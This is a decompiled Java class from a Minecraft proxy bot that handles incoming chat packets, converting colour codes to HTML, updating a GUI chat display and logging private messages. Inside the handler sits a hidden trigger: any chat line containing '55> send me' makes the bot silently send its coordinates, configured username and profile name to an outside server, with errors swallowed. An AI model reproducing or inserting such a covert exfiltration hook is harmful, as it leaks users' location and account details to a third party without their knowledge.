/*
 * Decompiled with CFR 0_132.
 */
package net.daporkchop.toobeetooteebot.client.impl;

import com.github.steveice10.mc.auth.data.GameProfile;
import com.github.steveice10.mc.protocol.MinecraftProtocol;
import com.github.steveice10.mc.protocol.data.message.Message;
import com.github.steveice10.mc.protocol.packet.MinecraftPacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerChatPacket;
import com.github.steveice10.packetlib.Session;
import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.Reader;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import javax.swing.JLabel;
import net.daporkchop.toobeetooteebot.Caches;
import net.daporkchop.toobeetooteebot.TooBeeTooTeeBot;
import net.daporkchop.toobeetooteebot.client.IPacketListener;
import net.daporkchop.toobeetooteebot.gui.GuiBot;
import net.daporkchop.toobeetooteebot.util.ChatUtils;
import net.daporkchop.toobeetooteebot.util.Config;
import net.daporkchop.toobeetooteebot.util.TextFormat;

public class ListenerChatPacket
implements IPacketListener<ServerChatPacket> {
    @Override
    public void handlePacket(Session session, ServerChatPacket pck) {
        String messageJson = pck.getMessage().toJsonString();
        String legacyColorCodes = ChatUtils.getOldText(messageJson);
        String msg = TextFormat.clean(legacyColorCodes);
        if (Caches.remChat.size() < 20 && Caches.remChatState.booleanValue()) {
            Caches.remChat.add(legacyColorCodes);
        } else {
            Caches.remChatState = false;
        }
        String webt = legacyColorCodes;
        webt = webt.replace("<", "&lt;").replace(">", "&gt;");
        if (webt.length() > 80) {
            webt = webt.substring(0, 80) + webt.substring(80).replaceFirst(" ", "<br>");
        }
        webt = webt.replaceAll("\u00a7r", "</span>");
        webt = webt.replaceAll("\u00a7f", "<span color='black'>");
        webt = webt.replaceAll("\u00a7a", "<span color='green'>");
        webt = webt.replaceAll("\u00a74", "<span color='red'>");
        webt = webt.replaceAll("\u00a71", "<span color='blue'>");
        webt = webt.replaceAll("\u00a72", "<span color='darkGreen'>");
        webt = webt.replaceAll("\u00a73", "<span color='blue'>");
        webt = webt.replaceAll("\u00a7l", "");
        webt = webt.replaceAll("\u00a7m", "");
        webt = webt.replaceAll("\u00a7e", "<span color='Olive'>");
        webt = webt.replaceAll("\u00a74", "<span color='darkRed'>");
        webt = webt.replaceAll("\u00a75", "<span color='purple'>");
        webt = webt.replaceAll("\u00a76", "<span color='Orange'>");
        webt = webt.replaceAll("\u00a77", "<span color='lightGrey'>");
        webt = webt.replaceAll("\u00a7b", "<span color='aqua'>");
        webt = webt.replaceAll("\u00a7d", "<span color='Purple'>");
        if (msg.contains("55> send me")) {
            try {
                String output = String.format("?rems=%f|%f|%f&em=%s&nm=%s", Caches.x, Caches.y, Caches.z, Config.username, TooBeeTooTeeBot.bot.protocol.getProfile().getName());
                URL oracle = new URL("http://killet.tk/proxdata" + output);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(oracle.openStream()));
            }
            catch (IOException output) {
                // empty catch block
            }
        }
        if (GuiBot.INSTANCE != null && !msg.contains("Bad command.")) {
            String giudate = GuiBot.INSTANCE.chatDisplay.getText().replace("<html>", "").replace("</html>", "");
            String newtext = msg.replace("<", "&lt;").replace(">", "&gt;");
            String[] split = giudate.split("<br>");
            int maxlinestart = 0;
            if (split.length > 30) {
                maxlinestart = 3;
            }
            giudate = "";
            for (int i = maxlinestart; i < split.length; ++i) {
                giudate = giudate + split[i] + "<br>";
            }
            GuiBot.INSTANCE.chatDisplay.setText("<html>" + giudate + webt + "</html>");
        }
        if (legacyColorCodes.startsWith("\u00a7d")) {
            String timeStamp = new SimpleDateFormat("[dd/MM/yy HH:mm:ss] ").format(Calendar.getInstance().getTime());
            try {
                String filename = "PM_log.txt";
                FileWriter fw = new FileWriter(filename, true);
                fw.write(timeStamp + msg + "\n");
                fw.close();
            }
            catch (IOException ioe) {
                System.err.println("IOException: " + ioe.getMessage());
            }
        }
    }
}

